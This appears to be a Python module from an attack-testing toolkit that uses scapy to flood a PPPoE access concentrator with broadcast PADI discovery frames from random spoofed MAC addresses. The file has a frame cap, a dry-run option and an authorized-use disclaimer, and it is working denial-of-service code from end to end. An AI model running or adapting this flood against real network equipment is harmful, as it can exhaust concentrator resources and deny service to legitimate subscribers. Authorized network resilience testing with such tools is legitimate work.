"""PPPoE discovery flooding: send PADI frames from random client MACs to an access concentrator.

A PPPoE client starts a session with a broadcast PADI (PPPoE Active Discovery Initiation).
The access concentrator answers each PADI with a PADO and keeps per-client state while the
client completes the discovery phase. A flood of PADI frames from many MACs, with no
follow-up PADR, makes the concentrator answer each one and reserves work for it, without
establishing a session.

This module sends the PADI frames only. The effect to measure is how many of them the
concentrator answers, and whether a legitimate client still gets a PADO while the flood
runs. A full session-pool exhaustion needs PPP sessions that stay open, which this module
does not hold.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import random
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, sendp
from scapy.layers.ppp import PPPoED
from scapy.packet import Packet

from macabre.attacks.common import BROADCAST_MAC, normalize_unicast_mac, random_mac

ETHERTYPE_PPPOE_DISCOVERY = 0x8863
PADI_CODE = 0x09
MAX_FRAMES = 1000


@dataclass(frozen=True)
class PppoeDiscoveryFloodingConfig:
    iface: str                          # attacker interface, on the segment with the concentrator
    frames: int = 10                    # PADI frames to send in total
    source_mac: str = ""                # fixed sender MAC; empty = a random MAC for each frame
    dry_run: bool = False               # build frames but do not send them

    def __post_init__(self) -> None:
        if self.source_mac:
            normalize_unicast_mac(self.source_mac)
        if not 1 <= self.frames <= MAX_FRAMES:
            raise ValueError(f"Frames must be between 1 and {MAX_FRAMES}.")


@dataclass
class PppoeDiscoveryFloodingStats:
    frames: int = 0
    status: str = ""


def build_padi(source_mac: str) -> Packet:
    """A broadcast PADI from `source_mac`, with no tags: the minimum a client sends to start discovery."""
    return Ether(src=normalize_unicast_mac(source_mac), dst=BROADCAST_MAC, type=ETHERTYPE_PPPOE_DISCOVERY) / PPPoED(
        code=PADI_CODE, sessionid=0
    )


def run_pppoe_discovery_flooding(
    config: PppoeDiscoveryFloodingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[PppoeDiscoveryFloodingStats], None],
    rng: random.Random | None = None,
    send: Callable[..., Any] | None = None,
) -> PppoeDiscoveryFloodingStats:
    """Send `frames` PADI frames, one per step, unless `stop_event` is set first."""
    rng = rng or random.Random()
    send = send or sendp

    if config.dry_run:
        origin = config.source_mac or "random MACs"
        stats = PppoeDiscoveryFloodingStats(
            status=f"Dry run: would send {config.frames} PADI frame(s) from {origin}. Nothing sent.",
        )
        on_progress(replace(stats))
        return stats

    stats = PppoeDiscoveryFloodingStats()
    for _ in range(config.frames):
        if stop_event.is_set():
            break
        source = config.source_mac or random_mac(rng)
        send(build_padi(source), iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
    return stats
